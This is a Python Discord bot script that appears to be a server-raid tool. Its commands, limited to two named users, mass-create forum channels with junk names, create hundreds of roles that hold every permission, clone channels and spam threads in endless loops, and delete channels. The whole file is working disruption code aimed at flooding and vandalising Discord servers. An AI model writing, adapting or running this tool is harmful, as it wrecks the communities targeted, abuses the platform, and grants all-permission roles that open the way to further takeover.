# -*- coding: UTF-8 -*-

import discord
import asyncio
import random
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='?', intents=intents)

random_string = ['w揪璽歲', 'j嘰兩法', 'i漿兄錚', 'i挪徐湔', 'i梯呶天', 'x嬋淮赭', 'a尾磺寺', 'o泥夷牲', 'x戾慌棟', 'm晏踐囪', 'b要騷摩', 'q謨櫥葬', 't涅此締', 'i硬抬銻', 'h入弱之', 'i華追績', 'n濱篩查', 'k孵丕亨', 'o呎迂恤', 'x對冬鉗', 'q瓠倡挨', 'a毗煎寇', 'i扒上露', 'u瑛師吹', 'r跼楔嗣', 'h呼縊匹', 'a澈殮拂', 'z購睿嗎', 'w弓拜癆', 'e巖澤薪', 'w盂驢崛', 'w喊汀諸', 'x菩兮津', 'n避譏輾', 'p盛象織', 'j另更耍', 'g責屢痲', 'p霸啜憬', 'r服嚕貉', 'n分延否', 'f中蕨器', 'f褶嵌菜', 'e溥趕洶', 'm安暮榷', 'g卸苧仞', 'p渥鹼很', 'w班艙螫', 's袱噩狩', 'u兒燃貨', 'l莎齊髏', 'r懈堆喝', 'n夠開孩', 'c剪伐錢', 'l挪嵌塢', 'o蹣物梱', 'x始軻唳', 'v濤遐範', 'e緻剪洲', 'q愴燦就', 'w徽簣培', 'l胱父財', 'u半渙褒', 'i篷河裔', 'y鞠鄂帕', 'w險筏寄', 'y嗚桓創', 'c異幟馭', 'z淞負瀉', 'z嘯稽銜', 'n運謄賓', 'g崁盯轔', 'e跑庖醣', 'd鞠莉獄', 'j熄祁訟', 'v制沼梧', 'p鰥鎂獄', 'x霞帽汙', 'j亙柱亨', 'z徑蠟疲', 'o爭莉麩', 'q培唳龍', 'u囀省株', 'q姘曖脾', 's畔名偏', 'h屏紜蟀', 'k鯽濛渚', 'e飄匿哥', 's梭鬚摸', 'l壤異駕', 'y冬如壘', 's茂預吟', 'g惘娟狀', 'd瀛泉蜜', 's埂練痢', 'x貳莠昀', 'p蘿柏嗤', 'b奚慕泡', 'j褒芳渣', 'x機御蜿', 'h偉租件']
channelname = "v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李"
guideline = "v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李v哈幟李"

def checkPerm(ctx):
    if f"{ctx.author.name}" in ["murdere", "h3dzer"]:
        return True
    else:
        return False

def generate(string, amount):
    generated_string = ""
    for i in range(0, amount):
        generated_string += random.choice(string)

    return generated_string

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print('------')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.errors.CheckFailure):
        print(f"{ctx.author.name} tried to use command")
    else:
        print(error)

@bot.event
async def on_thread_create(thread):
    await thread.applied_tags(name="hutao")


@commands.check(checkPerm)
@bot.command(aliases=["fg"])
async def forumgenerate(ctx, loop):
    guild = ctx.guild

    name = f"{channelname}"
    topic = f"{guideline}"

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(administrator=False,
                                                        view_channel=False,
                                                        manage_channels=False,
                                                        manage_permissions=False,
                                                        manage_webhooks=False,
                                                        create_instant_invite=False,
                                                        send_messages=False,
                                                        send_messages_in_threads=False,
                                                        create_public_threads=False,
                                                        create_private_threads=False,
                                                        embed_links=False,
                                                        attach_files=False,
                                                        add_reactions=False,
                                                        use_external_emojis=False,
                                                        use_external_stickers=False,
                                                        mention_everyone=False,
                                                        manage_messages=False,
                                                        manage_threads=False,
                                                        read_message_history=False,
                                                        send_tts_messages=False,
                                                        use_application_commands=False,
                                                        use_voice_activation=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }
    overwrites2 = {
        guild.default_role: discord.PermissionOverwrite(administrator=False,
                                                        view_channel=False,
                                                        manage_channels=False,
                                                        manage_permissions=False,
                                                        manage_webhooks=False,
                                                        create_instant_invite=False,
                                                        send_messages=False,
                                                        send_messages_in_threads=False,
                                                        create_public_threads=False,
                                                        create_private_threads=False,
                                                        embed_links=False,
                                                        attach_files=False,
                                                        add_reactions=False,
                                                        use_external_emojis=False,
                                                        use_external_stickers=False,
                                                        mention_everyone=False,
                                                        manage_messages=False,
                                                        manage_threads=False,
                                                        read_message_history=False,
                                                        send_tts_messages=False,
                                                        use_application_commands=False,
                                                        use_voice_activation=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }
    overwrites3 = {
        guild.default_role: discord.PermissionOverwrite(administrator=False,
                                                        view_channel=False,
                                                        manage_channels=False,
                                                        manage_permissions=False,
                                                        manage_webhooks=False,
                                                        create_instant_invite=False,
                                                        send_messages=False,
                                                        send_messages_in_threads=False,
                                                        create_public_threads=False,
                                                        create_private_threads=False,
                                                        embed_links=False,
                                                        attach_files=False,
                                                        add_reactions=False,
                                                        use_external_emojis=False,
                                                        use_external_stickers=False,
                                                        mention_everyone=False,
                                                        manage_messages=False,
                                                        manage_threads=False,
                                                        read_message_history=False,
                                                        send_tts_messages=False,
                                                        use_application_commands=False,
                                                        use_voice_activation=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }
    test = guild.roles
    sublist_length = len(test) // 3

    # Split the original list into three sub-lists
    sublist1 = test[:sublist_length]
    sublist2 = test[sublist_length:2*sublist_length]
    sublist3 = test[2*sublist_length:]
    for r in sublist1:
        if r.name not in ["@everyone", "Hutao BOT", "W"]:
            overwrites.update({r: discord.PermissionOverwrite(administrator=False,
                                                              view_channel=False,
                                                              manage_channels=False,
                                                              manage_permissions=False,
                                                              manage_webhooks=False,
                                                              create_instant_invite=False,
                                                              send_messages=False,
                                                              send_messages_in_threads=False,
                                                              create_public_threads=False,
                                                              create_private_threads=False,
                                                              embed_links=False,
                                                              attach_files=False,
                                                              add_reactions=False,
                                                              use_external_emojis=False,
                                                              use_external_stickers=False,
                                                              mention_everyone=False,
                                                              manage_messages=False,
                                                              manage_threads=False,
                                                              read_message_history=False,
                                                              send_tts_messages=False,
                                                              use_application_commands=False,
                                                              use_voice_activation=False
                                                              )})
    for r in sublist2:
        if r.name not in ["@everyone", "Hutao BOT", "W"]:
            overwrites2.update({r: discord.PermissionOverwrite(administrator=False,
                                                              view_channel=False,
                                                              manage_channels=False,
                                                              manage_permissions=False,
                                                              manage_webhooks=False,
                                                              create_instant_invite=False,
                                                              send_messages=False,
                                                              send_messages_in_threads=False,
                                                              create_public_threads=False,
                                                              create_private_threads=False,
                                                              embed_links=False,
                                                              attach_files=False,
                                                              add_reactions=False,
                                                              use_external_emojis=False,
                                                              use_external_stickers=False,
                                                              mention_everyone=False,
                                                              manage_messages=False,
                                                              manage_threads=False,
                                                              read_message_history=False,
                                                              send_tts_messages=False,
                                                              use_application_commands=False,
                                                              use_voice_activation=False
                                                              )})
    for r in sublist3:
        if r.name not in ["@everyone", "Hutao BOT", "W"]:
            overwrites3.update({r: discord.PermissionOverwrite(administrator=False,
                                                              view_channel=False,
                                                              manage_channels=False,
                                                              manage_permissions=False,
                                                              manage_webhooks=False,
                                                              create_instant_invite=False,
                                                              send_messages=False,
                                                              send_messages_in_threads=False,
                                                              create_public_threads=False,
                                                              create_private_threads=False,
                                                              embed_links=False,
                                                              attach_files=False,
                                                              add_reactions=False,
                                                              use_external_emojis=False,
                                                              use_external_stickers=False,
                                                              mention_everyone=False,
                                                              manage_messages=False,
                                                              manage_threads=False,
                                                              read_message_history=False,
                                                              send_tts_messages=False,
                                                              use_application_commands=False,
                                                              use_voice_activation=False
                                                              )})

    if loop == "no":
        for i in range(0, 500):
            await guild.create_forum(name=name, topic=topic, overwrites=random.choice([overwrites,overwrites2,overwrites3]))
            await asyncio.sleep(1.2)
    elif loop == "yes":
        while True:
            try:
                await guild.create_forum(name=name, topic=topic, overwrites=random.choice([overwrites,overwrites2,overwrites3]))
                pass
            except Exception as e:
                print(f"{e}, but loop option is on so continue running")
                pass
            await asyncio.sleep(1.2)
    print("Done, enjoy :)")

@commands.check(checkPerm)
@bot.command(aliases=["rg"])
async def rolegenerate(ctx, loop):
    guild = ctx.guild

    name = generate(random_string, 25)
    permissions = discord.Permissions.all()
    color = discord.Color.red()
    
    if loop == "no":
        for i in range(0, 250):
            await guild.create_role(name=name, permissions=permissions, color=color)
            await asyncio.sleep(0.5)
    elif loop == "yes":
        while True:
            try:
                await guild.create_role(name=name, permissions=permissions, color=color)
                pass
            except Exception as e:
                print(f"{e}, but loop option is on so continue running")
                pass
            await asyncio.sleep(0.5)

    print("Done, enjoy :)")
    
@commands.check(checkPerm)
@bot.command(aliases=["cc"])
async def channelclone(ctx):
    existing_channel = discord.utils.get(ctx.guild.channels, name=f"{channelname}")
    while existing_channel is not None:
        await existing_channel.clone()
        existing_channel = discord.utils.get(ctx.guild.channels, name=f"{channelname}")
        await asyncio.sleep(1)

@commands.check(checkPerm)
@bot.command(aliases=["fs"])
async def forumthreadspam(ctx):
    while True:
        existing_channel = ctx.guild.channels
        for i in existing_channel:
            if i.name == f"{channelname}":
                print("startdo")
                for ga in range(0, 3000):
                    a = generate(random_string,25)
                    b = generate(random_string,500)
                    try:
                        await i.create_thread(name=a, content=b, auto_archive_duration=60)
                        pass
                    except Exception as e:
                        print(e)
                        pass
                    await asyncio.sleep(4)
                print("1 channel done")
        print("1loop")

@commands.check(checkPerm)
@bot.command(aliases=["ohno"])
async def deleteallchannel(ctx):
    existing_channel = ctx.guild.channels
    for i in existing_channel:
        if len(i.name) == 100:
            await i.delete()

bot.run('')
